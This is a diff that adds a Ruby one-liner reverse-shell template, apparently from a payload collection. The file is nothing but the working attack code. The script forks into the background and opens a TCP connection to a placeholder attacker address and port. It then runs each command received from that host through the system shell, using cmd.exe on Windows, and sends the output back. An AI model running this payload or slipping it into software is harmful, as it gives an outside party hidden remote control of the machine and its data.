@@ -1,0 +1,17 @@
+ruby -rsocket -e 'exit if fork
+c = TCPSocket.new("__IPADDR__", __PORT__)
+shell = (RUBY_PLATFORM =~ /win32|mswin|cygwin|mingw/i) ? "cmd.exe /c " : ""
+loop do
+  c.gets.chomp!
+  exit! if $_ == "exit"
+  if $_ =~ /cd (.+)/i
+    Dir.chdir($1)
+  else
+    begin
+      IO.popen("#{shell}#{$_}", "r") { |io| c.print io.read }
+    rescue
+      c.puts "failed: #{$_}"
+    end
+  end
+end'
+
